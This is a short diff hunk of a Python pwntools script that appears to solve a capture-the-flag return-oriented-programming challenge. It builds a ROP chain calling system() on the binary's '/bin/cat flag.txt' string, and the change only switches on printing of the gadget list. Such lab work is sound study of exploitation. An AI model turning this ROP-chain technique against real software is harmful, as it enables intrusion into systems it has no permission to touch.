@@ -14,8 +14,8 @@ bincat_addr = next(elf.search(b'/bin/cat'))
 rop = ROP(elf)  # Load rop gadgets
 rop.system(bincat_addr)  # Call system with /bin/cat flag.txt address
 
+pprint(rop.gadgets)
 print(rop.dump())
-# pprint(rop.gadgets)
 
 # Rop chain
 rop_chain = rop.chain()
